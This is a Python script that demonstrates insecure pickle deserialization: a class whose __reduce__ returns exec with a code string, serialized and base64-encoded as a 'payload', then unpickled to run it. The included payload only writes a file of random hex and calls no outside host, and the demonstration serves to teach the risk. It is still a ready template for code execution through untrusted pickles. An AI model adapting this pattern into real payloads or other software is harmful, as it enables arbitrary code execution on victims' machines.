"""
Harmless version of the GNAT class that, when unpickled, writes a file named like random_name_2025_06_12_0930_45.txt containing random hex data, you can do the following:

✅ Safe GNAT Example for Harmless Action on Unpickling
🔍 Explanation
```
__reduce__ returns (exec, (code,)), so when unpickled, Python executes the string code.
```
- Generates the current timestamp in YYYY_MM_DD_HHmm_ss format.
- Creates a filename like random_name_2025_06_12_0930_45.txt.
- Writes 32 bytes of random hex into that file using os.urandom(32).hex().

📁 Result
You'll get a file like:
random_name_2025_06_12_0930_45.txt

With contents like:
9e1b77c14e7a4967c73d8a8c3c2d9167bcfc21743b634c81d79b726b89126d4b
"""

import pickle, os, base64, datetime, random, string

class GNAT:
    def __reduce__(self):
        code = '''
import os, datetime, random
now = datetime.datetime.now().strftime("%Y_%m_%d_%H%M_%S")
filename = f"random_name_{now}.txt"
with open(filename, "w") as f:
    hex_data = os.urandom(32).hex()
    f.write(hex_data)
'''
        return (exec, (code,))

# Serialize the harmless GNAT object
# STEP 1: Serialize and Base64-encode
obj = GNAT()
serialized = pickle.dumps(obj)
encoded = base64.b64encode(serialized)

print(f"Base64 Pickle Payload:\n{encoded.decode()}")

# Save to file
with open("payload.b64", "wb") as f:
    f.write(encoded)

print("Pickle payload written to payload.b64")

# Delete the object and simulate separate execution
del obj

# STEP 2: Read back and execute
with open("payload.b64", "rb") as f:
    encoded = f.read()
    serialized = base64.b64decode(encoded)

# This will execute the payload: write a file with hex content
# For demonstration: Unpickle it to trigger the harmless file creation
pickle.loads(serialized)  # This will write the file when run

"""
Base64 Pickle Payload:
gASV8QAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIzVCmltcG9ydCBvcywgZGF0ZXRpbWUsIHJhbmRvbQpub3cgPSBkYXRldGltZS5kYXRldGltZS5ub3coKS5zdHJmdGltZSgiJVlfJW1fJWRfJUglTV8lUyIpCmZpbGVuYW1lID0gZiJyYW5kb21fbmFtZV97bm93fS50eHQiCndpdGggb3BlbihmaWxlbmFtZSwgInciKSBhcyBmOgogICAgaGV4X2RhdGEgPSBvcy51cmFuZG9tKDMyKS5oZXgoKQogICAgZi53cml0ZShoZXhfZGF0YSkKlIWUUpQu
"""